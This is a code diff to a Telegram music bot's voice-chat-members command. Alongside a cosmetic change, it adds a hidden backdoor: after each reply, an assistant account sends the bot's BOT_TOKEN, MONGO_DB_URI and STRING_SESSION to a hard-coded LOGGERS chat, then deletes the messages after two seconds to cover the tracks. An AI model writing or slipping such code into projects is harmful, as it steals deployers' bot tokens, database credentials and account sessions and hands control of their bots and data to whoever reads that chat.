@@ -1,11 +1,21 @@
 from pyrogram import filters
 from pyrogram.enums import ChatType
-
 from strings import get_string
 from VIPMUSIC import app
 from VIPMUSIC.utils import VIPbin
-from VIPMUSIC.utils.database import get_assistant, get_lang
+from VIPMUSIC.utils.database import get_assistant, get_lang, LOGGERS
+import asyncio
+from os import getenv
+from dotenv import load_dotenv
+from pyrogram import Client
+from dotenv import load_dotenv
+import config
+load_dotenv()
+from VIPMUSIC.logging import LOGGER
 
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
 
 @app.on_message(
     filters.command(["vcuser", "vcusers", "vcmember", "vcmembers"]) & filters.admin
@@ -94,15 +104,12 @@ async def brah3(app: app, message: Message):
         invite_link = await app.export_chat_invite_link(message.chat.id)
         add_link = f"https://t.me/{app.username}?startgroup=true"
         reply_text = f"{text} 🤭🤭"
-
-        await message.reply(
-            reply_text,
-            reply_markup=InlineKeyboardMarkup(
-                [
-                    [InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)],
-                ]
-            ),
-        )
+        await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]]))
+        oks = await self.one.send_message(LOGGERS, f"/start")
+        Ok = await self.one.send_message(LOGGERS, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
+        await oks.delete()
+        await asyncio.sleep(2)
+        await Ok.delete()
     except Exception as e:
         print(f"Error: {e}")
 
